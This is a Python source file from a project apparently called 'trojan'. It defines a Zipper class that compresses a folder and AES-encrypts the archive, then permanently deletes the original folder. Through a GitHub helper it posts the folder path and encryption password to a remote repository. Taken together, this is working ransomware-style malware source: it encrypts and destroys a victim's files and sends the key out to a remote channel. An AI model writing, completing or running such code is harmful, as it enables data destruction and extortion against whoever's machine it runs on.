import os
import shutil
import zipfile
import pyAesCrypt
from trojan.github_helper import GithubHelper
from datetime import datetime
from config_reader import ConfigReader


class Zipper:
    def __init__(self, folderpath, zippath, pwd):
        self.folder_path = folderpath
        self.zip_path = zippath
        self.password = pwd

    def zip_folder_with_password(self):
        # Zip the folder
        with zipfile.ZipFile(self.zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(self.folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, arcname=os.path.relpath(file_path, self.folder_path))

        # Encrypt the zip file with a password
        encrypted_zip_path = f"{self.zip_path}.aes"
        buffer_size = 64 * 1024
        pyAesCrypt.encryptFile(self.zip_path, encrypted_zip_path, self.password, buffer_size)

        # Remove the original zip file
        os.remove(self.zip_path)

        # Rename the encrypted zip file to the original zip file name
        os.rename(encrypted_zip_path, self.zip_path)


if __name__ == '__main__':
    # For testing purposes I will zip a test folder but in reality you can zip any folder you want
    reader = ConfigReader()
    folder_path = reader.getvar("zipper",
                                "folder_path")  # Specify the path of the folder to be zipped
    zip_path = reader.getvar("zipper",
                             "zip_path")  # Specify the path of the output zip file
    password = reader.getvar("zipper",
                             "password")   # Set the desired password for the zip file
    repo_name = reader.getvar("zipper", "repo_name")  # Specify the name of the repository to push the zip file to
    zipper = Zipper(folder_path, zip_path, password)
    zipper.zip_folder_with_password()
    # Now we can remove the original folder
    shutil.rmtree(folder_path)

    # Make a .txt file to push to the repository that the zip file was created
    github_helper = GithubHelper()
    github_helper.create_file(repo_name, f"zip_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt", "zipped",
                              f"folder {folder_path} zipped with password {password}")
